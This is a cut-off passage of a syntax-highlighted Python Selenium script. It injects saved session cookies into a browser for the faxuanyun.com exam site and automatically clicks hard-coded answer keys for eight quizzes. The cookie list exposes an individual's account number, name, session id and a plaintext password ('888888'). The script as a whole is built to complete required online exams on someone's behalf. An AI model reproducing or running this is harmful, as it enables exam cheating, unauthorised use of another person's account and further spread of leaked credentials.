punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'userTypeFog'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'%221%22'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'expiry'</span><span class="token punctuation">:</span> <span class="token number">1636041599</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'loginUser'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'%7B%22userAccount%22%3A%223709030080069%22%2C%22userName%22%3A%22%E5%BC%A0%E4%BC%A0%E6%B3%A2%22%2C%22userType%22%3A%221%22%2C%22roleId%22%3A%227%22%2C%22domainCode%22%3A%22100027008003008%22%2C%22rankId%22%3A%22241%22%2C%22lockFlag%22%3A%220%22%2C%22areaCode%22%3A%22370000%22%2C%22id%22%3A%2235371725%22%2C%22sid%22%3A%226276eded51af4e6abe78e4a0ffd41543%22%2C%22politicsCode%22%3A%22p00%22%2C%22onlineTime%22%3A1636032216000%7D'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'expiry'</span><span class="token punctuation">:</span> <span class="token number">1636637016</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'RmbUser'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'%7B%22RmbUser%22%3Afalse%2C%22userAccount%22%3A%223709030080069%22%2C%22userPassword%22%3A%22888888%22%7D'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'labelType'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'%221%22'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'fxInd'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'I'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'expiry'</span><span class="token punctuation">:</span> <span class="token number">1636034018</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'_qdda'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'3-1.1'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'expiry'</span><span class="token punctuation">:</span> <span class="token number">1667568206</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'__root_domain_v'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'.faxuanyun.com'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'expiry'</span><span class="token punctuation">:</span> <span class="token number">1636041599</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'area'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'%22000000%22'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'_qddab'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'3-re7vil.kvkzc1d4'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'expiry'</span><span class="token punctuation">:</span> <span class="token number">1667568204</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Hm_lvt_714af84c5240734e0f5aefd5e3b68647'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'1636032204'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'expiry'</span><span class="token punctuation">:</span> <span class="token number">1667568218</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'_qddaz'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'QD.467936032206022'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'passwordLevel'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'fxCode'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'Aundefined'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Hm_lpvt_714af84c5240734e0f5aefd5e3b68647'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'1636032204'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'bindType'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'rid'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'e0bc95ec1dd764775fb3d7861baa5776'</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span>url_<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">5191</span><span class="token operator">+</span>i<span class="token punctuation">,</span>title<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">4427</span><span class="token operator">+</span>i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> cookiie<span class="token punctuation">:</span>        diver<span class="token punctuation">.</span>add_cookie<span class="token punctuation">(</span>item<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    diver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token comment">#diver.maximize_window()</span>    diver<span class="token punctuation">.</span>refresh<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#第一套题答案</span>    answer_1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'ABD'</span><span class="token punctuation">,</span><span class="token string">'AC'</span><span class="token punctuation">,</span><span class="token string">'ABCD'</span><span class="token punctuation">,</span><span class="token string">'AD'</span><span class="token punctuation">,</span><span class="token string">'AC'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token comment">#第二套答案</span>    answer_2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'CD'</span><span class="token punctuation">,</span><span class="token string">'ACD'</span><span class="token punctuation">,</span><span class="token string">'AC'</span><span class="token punctuation">,</span><span class="token string">'BCD'</span><span class="token punctuation">,</span><span class="token string">'ABCD'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    answer_3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'ABD'</span><span class="token punctuation">,</span><span class="token string">'ABCD'</span><span class="token punctuation">,</span><span class="token string">'ABCD'</span><span class="token punctuation">,</span><span class="token string">'AB'</span><span class="token punctuation">,</span><span class="token string">'BC'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    answer_4<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'ABCD'</span><span class="token punctuation">,</span><span class="token string">'ABCD'</span><span class="token punctuation">,</span><span class="token string">'ABCD'</span><span class="token punctuation">,</span><span class="token string">'ABCD'</span><span class="token punctuation">,</span><span class="token string">'ABCD'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    answer_5<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'ABC'</span><span class="token punctuation">,</span><span class="token string">'AB'</span><span class="token punctuation">,</span><span class="token string">'ABD'</span><span class="token punctuation">,</span><span class="token string">'ABCD'</span><span class="token punctuation">,</span><span class="token string">'AB'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    answer_6<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'ABCD'</span><span class="token punctuation">,</span><span class="token string">'ABD'</span><span class="token punctuation">,</span><span class="token string">'ABD'</span><span class="token punctuation">,</span><span class="token string">'ABCD'</span><span class="token punctuation">,</span><span class="token string">'ABCD'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    answer_7<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'ACD'</span><span class="token punctuation">,</span><span class="token string">'ABCD'</span><span class="token punctuation">,</span><span class="token string">'ABCD'</span><span class="token punctuation">,</span><span class="token string">'ABC'</span><span class="token punctuation">,</span><span class="token string">'ABD'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    answer_8<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'ABCD'</span><span class="token punctuation">,</span><span class="token string">'AB'</span><span class="token punctuation">,</span><span class="token string">'CD'</span><span class="token punctuation">,</span><span class="token string">'ACD'</span><span class="token punctuation">,</span><span class="token string">'AC'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    answer<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    answer<span class="token punctuation">.</span>append<span class="token punctuation">(</span>answer_1<span class="token punctuation">)</span>    answer<span class="token punctuation">.</span>append<span class="token punctuation">(</span>answer_2<span class="token punctuation">)</span>    answer<span class="token punctuation">.</span>append<span class="token punctuation">(</span>answer_3<span class="token punctuation">)</span>    answer<span class="token punctuation">.</span>append<span class="token punctuation">(</span>answer_4<span class="token punctuation">)</span>    answer<span class="token punctuation">.</span>append<span class="token punctuation">(</span>answer_5<span class="token punctuation">)</span>    answer<span class="token punctuation">.</span>append<span class="token punctuation">(</span>answer_6<span class="token punctuation">)</span>    answer<span class="token punctuation">.</span>append<span class="token punctuation">(</span>answer_7<span class="token punctuation">)</span>    answer<span class="token punctuation">.</span>append<span class="token punctuation">(</span>answer_8<span class="token punctuation">)</span>    <span class="token comment"># if(choose==1):</span>    <span class="token comment">#     answer=answer_1</span>    <span class="token comment"># elif(choose==2):</span>    <span class="token comment">#     answer=answer_2</span>    <span class="token comment"># elif(choose==3):</span>    <span class="token comment">#     answer=answer_3</span>    <span class="token comment"># elif(choose==4):</span>    <span class="token comment">#     answer=answer_4</span>    <span class="token comment"># elif(choose==5):</span>    <span class="token comment">#     answer=answer_5</span>    <span class="token comment"># elif(choose==6):</span>    <span class="token comment">#     answer=answer_6</span>    <span class="token comment"># elif(choose==7):</span>    <span class="token comment">#     answer=answer_7</span>    <span class="token comment"># else:</span>    <span class="token comment">#     answer=answer_8</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        diver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"//div[@id='timucontent']//input[@type='radio'][@value='&#123;0&#125;']"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        diver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"//a[@onclick='sps.next()']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> z <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>z<span class="token punctuation">]</span><span class="token punctuation">:</span>            diver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"//div[@id='timucontent']//input[@type='checkbox'][@value='&#123;0&#125;']"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        diver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"//a[@onclick='sps.next()']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        diver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"//div[@id='timucontent']//input[@type='radio'][@value='&#123;0&#125;']"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            diver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"//a[@onclick='sps.next()']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token 